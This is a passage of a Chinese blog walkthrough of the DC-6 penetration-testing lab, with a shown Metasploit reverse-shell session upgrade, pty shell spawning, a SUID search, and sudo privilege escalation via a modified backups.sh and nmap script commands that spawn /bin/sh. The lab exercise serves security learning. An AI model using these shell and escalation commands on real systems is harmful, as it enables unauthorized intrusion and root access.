class="number">-05</span><span class="number">-17</span> <span class="number">04</span>:<span class="number">11</span>:<span class="number">21</span> +<span class="number">0800</span></span><br><span class="line">[*] Command stager progress: <span class="number">100.00</span>% (<span class="number">773</span>/<span class="number">773</span> bytes)</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                   Information              Connection</span><br><span class="line">  --  ----  ----                   -----------              ----------</span><br><span class="line">  <span class="number">1</span>         shell sparc/bsd                                 <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>:<span class="number">4444</span> -&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.135</span>:<span class="number">55952</span> (<span class="number">10.10</span><span class="number">.10</span><span class="number">.135</span>)</span><br><span class="line">  <span class="number">2</span>         meterpreter x86/linux  www-data @ <span class="number">10.10</span><span class="number">.10</span><span class="number">.135</span>  <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>:<span class="number">4321</span> -&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.135</span>:<span class="number">58272</span> (<span class="number">10.10</span><span class="number">.10</span><span class="number">.135</span>)</span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions <span class="number">2</span></span><br><span class="line">[*] Starting interaction with <span class="number">2.</span>..</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer     : <span class="number">10.10</span><span class="number">.10</span><span class="number">.135</span></span><br><span class="line">OS           : Debian <span class="number">9.8</span> (Linux <span class="number">4.9</span><span class="number">.0</span><span class="number">-8</span>-amd64)</span><br><span class="line">Architecture : x64</span><br><span class="line">BuildTuple   : i486-linux-musl</span><br><span class="line">Meterpreter  : x86/linux</span><br></pre></td></tr></table></figure>
+
+<p>然后即可操作 <code>shell -t</code> 进入交互式，若 shell -t 无法进入，则直接输入 shell，然后操作 Python 交互式 SHELL 即可</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">1617</span> created.</span><br><span class="line">Channel <span class="number">4</span> created.</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@dc-<span class="number">6</span>:/home$ export TERM=xterm</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="内部信息收集"><a href="#内部信息收集" class="headerlink" title="内部信息收集"></a>内部信息收集</h2><h3 id="内核与发行版"><a href="#内核与发行版" class="headerlink" title="内核与发行版"></a>内核与发行版</h3><p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517041725817.png" alt="image-20230517041725817"></p>
+<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><blockquote>
+<p>无可利用 suid</p>
+</blockquote>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm <span class="number">-4000</span> <span class="number">2</span>&lt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-<span class="number">6</span>:<span class="regexp">/home$ find /</span> -perm -<span class="number">4000</span> <span class="number">2</span>&lt;<span class="regexp">/dev/null</span></span><br><span class="line">/usr/lib/dbus-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SUDO"><a href="#SUDO" class="headerlink" title="SUDO"></a>SUDO</h3><blockquote>
+<p>无 sudo</p>
+</blockquote>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517041816669.png" alt="image-20230517041816669"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>在 mark home 目录下发现 graham 密码：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517042249110.png" alt="image-20230517042249110"></p>
+<p>在 jens home 目录下发现 backups.sh shell 脚本，疑似计划任务，查看计划任务表后排除该提权法</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517042405384.png" alt="image-20230517042405384"></p>
+<p>切换到 graham 发现有 sudo 位，文件是：<code>/home/jens/backups.sh</code></p>
+<p>查看 graham 权限，发现所属 devs 组，可任意操作 <code>backups.sh</code> 文件：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517043226116.png" alt="image-20230517043226116"></p>
+<p>修改 <code>backups.sh </code>内容如下：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517043426266.png" alt="image-20230517043426266"></p>
+<p>执行后得到 jens 的 shell：</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517043836599.png" alt="image-20230517043836599"></p>
+<h3 id="利用-SUDO-提权"><a href="#利用-SUDO-提权" class="headerlink" title="利用 SUDO 提权"></a>利用 SUDO 提权</h3><p>nmap sudo 提权</p>
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517043900025.png" alt="image-20230517043900025"></p>
+<p>该方法失败：仅适用于低版本 Nmap</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>
+
+<p>利用方法 2：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo <span class="string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/image-20230517044545250.png" alt="image-20230517044545250"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Tripse/">Tripse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://tripse.github.io/2023/05/19/DC-6/">https://tripse.github.io/2023/05/19/DC-6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://tripse.github.io" target="_blank">Tripse Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%94%E7%BB%83/">渗透测试演练</a></div><div class="post_share"><div class="social-share" data-image="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://security-note.oss-cn-hangzhou.aliyuncs.com/2.jpg" target="_blank"><img class="post-qr-code-img" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/2.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://security-note.oss-cn-hangzhou.aliyuncs.com/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/05/19/DC-7/"><img class="prev-cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">渗透测试演练 DC-7</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/19/DC-5/"><img class="next-cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">渗透测试演练 DC-5</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/05/11/DC-1/" title="渗透测试演练 DC-1"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-11</div><div class="title">渗透测试演练 DC-1</div></div></a></div><div><a href="/2023/05/19/DC-5/" title="渗透测试演练 DC-5"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-19</div><div class="title">渗透测试演练 DC-5</div></div></a></div><div><a href="/2023/05/12/DC-2/" title="渗透测试演练 DC-2"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-12</div><div class="title">渗透测试演练 DC-2</div></div></a></div><div><a href="/2023/05/19/DC-7/" title="渗透测试演练 DC-7"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-19</div><div class="title">渗透测试演练 DC-7</div></div></a></div><div><a href="/2023/05/19/DC-4/" title="渗透测试演练 DC-4"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-19</div><div class="title">渗透测试演练 DC-4</div></div></a></div><div><a href="/2023/05/19/DC-8/" title="渗透测试演练 DC-8"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-19</div><div class="title">渗透测试演练 DC-8</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/dog1.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tripse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tripse/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Tripse/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:leadlifeLD@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://space.bilibili.com/324542959?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="iconfont  icon-bilibili"></i></a><a class="social-icon" href="https://jq.qq.com/?_wv=1027&amp;k=dF6M99TL" target="_blank" title="QQ群"><i class="iconfont  icon-QQ"></i></a><a class="social-icon" href="https://tripse.github.io/wechat.html" target="_blank" title=""><i class="iconfont  icon-wechat-fill"></i></a><a class="social-icon" href="https://tieba.baidu.com/f?ie=utf-8&amp;kw=leadlife" target="_blank" title=""><i class="iconfont  icon-social-tieba"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-6"><span class="toc-number">1.</span> <span class="toc-text">DC-6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">外部信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-ICMP-%E6%89%AB%E6%8F%8F%E5%8F%91%E7%8E%B0%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.1.1.</span> <span class="toc-text">Nmap ICMP 扫描发现主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fsacn-%E6%8E%A2%E6%B5%8B%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.1.2.</span> <span class="toc-text">Fsacn 探测开放端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-%E8%BF%9B%E8%A1%8C%E8%AF%A6%E7%BB%86%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">Nmap 进行详细端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9-Hosts"><span class="toc-number">1.1.4.</span> <span class="toc-text">修改 Hosts</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMSeek-%E5%88%A4%E6%96%AD-CMS-%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.5.</span> <span class="toc-text">CMSeek 判断 CMS 版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#searchsploit-%E6%90%9C%E5%AF%BB-cms-%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.6.</span> <span class="toc-text">searchsploit 搜寻 cms 版本漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0"><span class="toc-number">1.2.</span> <span class="toc-text">进入后台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.2.1.</span> <span class="toc-text">暴力破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0-GetSHELL"><span class="toc-number">1.3.</span> <span class="toc-text">后台 GetSHELL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B0%9D%E8%AF%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞利用尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%B3%E5%AE%9A-SHELL"><span class="toc-number">1.3.2.</span> <span class="toc-text">稳定 SHELL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%98%E5%8C%96-SHELL"><span class="toc-number">1.3.3.</span> <span class="toc-text">优化 SHELL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.4.</span> <span class="toc-text">内部信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E4%B8%8E%E5%8F%91%E8%A1%8C%E7%89%88"><span class="toc-number">1.4.1.</span> <span class="toc-text">内核与发行版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID"><span class="toc-number">1.4.2.</span> <span class="toc-text">SUID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUDO"><span class="toc-number">1.4.3.</span> <span class="toc-text">SUDO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.5.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-SUDO-%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.1.</span> <span class="toc-text">利用 SUDO 提权</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/07/%E4%BC%98%E7%A7%80%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/" title="优秀浏览器插件推荐"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/BrowserPlugins.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="优秀浏览器插件推荐"/></a><div class="content"><a class="title" href="/2023/06/07/%E4%BC%98%E7%A7%80%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/" title="优秀浏览器插件推荐">优秀浏览器插件推荐</a><time datetime="2023-06-07T11:43:45.009Z" title="发表于 2023-06-07 19:43:45">2023-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/19/DC-9/" title="渗透测试演练 DC-9"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试演练 DC-9"/></a><div class="content"><a class="title" href="/2023/05/19/DC-9/" title="渗透测试演练 DC-9">渗透测试演练 DC-9</a><time datetime="2023-05-19T10:42:09.757Z" title="发表于 2023-05-19 18:42:09">2023-05-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/19/DC-8/" title="渗透测试演练 DC-8"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试演练 DC-8"/></a><div class="content"><a class="title" href="/2023/05/19/DC-8/" title="渗透测试演练 DC-8">渗透测试演练 DC-8</a><time datetime="2023-05-19T10:42:09.756Z" title="发表于 2023-05-19 18:42:09">2023-05-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/19/DC-7/" title="渗透测试演练 DC-7"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试演练 DC-7"/></a><div class="content"><a class="title" href="/2023/05/19/DC-7/" title="渗透测试演练 DC-7">渗透测试演练 DC-7</a><time datetime="2023-05-19T10:42:09.755Z" title="发表于 2023-05-19 18:42:09">2023-05-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/19/DC-6/" title="渗透测试演练 DC-6"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试演练 DC-6"/></a><div class="content"><a class="title" href="/2023/05/19/DC-6/" title="渗透测试演练 DC-6">渗透测试演练 DC-6</a><time datetime="2023-05-19T10:42:09.754Z" title="发表于 2023-05-19 18:42:09">2023-05-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Tripse</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
